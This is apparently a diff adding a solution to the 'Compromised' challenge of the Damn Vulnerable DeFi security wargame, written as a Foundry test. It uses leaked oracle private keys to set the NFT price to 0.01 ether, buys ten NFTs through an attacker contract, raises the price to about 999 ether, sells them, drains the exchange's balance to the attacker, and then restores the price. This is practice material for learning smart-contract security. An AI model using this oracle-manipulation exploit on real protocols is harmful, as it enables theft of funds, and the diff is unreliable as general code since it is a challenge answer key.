@@ -76,6 +76,42 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        address oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        address oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+
+        vm.startPrank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 0.01 ether);
+        vm.stopPrank();
+
+        vm.startPrank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 0.01 ether);
+        vm.stopPrank();
+
+        vm.startPrank(attacker);
+        CompromisedAttacker compromisedAttacker =
+            new CompromisedAttacker{value: 0.1 ether}(address(damnValuableNFT), payable(address(exchange)));
+        compromisedAttacker.buy();
+        vm.stopPrank();
+
+        vm.startPrank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 999.01 ether);
+        vm.stopPrank();
+
+        vm.startPrank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 999.01 ether);
+        vm.stopPrank();
+
+        vm.startPrank(attacker);
+        compromisedAttacker.sell();
+        vm.stopPrank();
+
+        vm.startPrank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
+
+        vm.startPrank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -97,4 +133,36 @@ contract Compromised is Test {
         // NFT price shouldn't have changed
         assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
+}
+
+contract CompromisedAttacker {
+    address damnValuableNFT;
+    address payable exchange;
+    address attacker;
+
+    constructor(address damnValuableNFT_, address payable exchange_) payable {
+        damnValuableNFT = damnValuableNFT_;
+        exchange = exchange_;
+        attacker = msg.sender;
+    }
+
+    function buy() external payable {
+        for (uint256 i; i < 10; i++) {
+            Exchange(payable(exchange)).buyOne{value: 0.01 ether}();
+        }
+    }
+
+    function sell() external payable {
+        for (uint256 i; i < 10; i++) {
+            DamnValuableNFT(damnValuableNFT).approve(exchange, i);
+            Exchange(payable(exchange)).sellOne(i);
+        }
+        payable(attacker).transfer(address(this).balance);
+    }
+
+    function onERC721Received(address from, address to, uint256 tokenId, bytes memory data) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
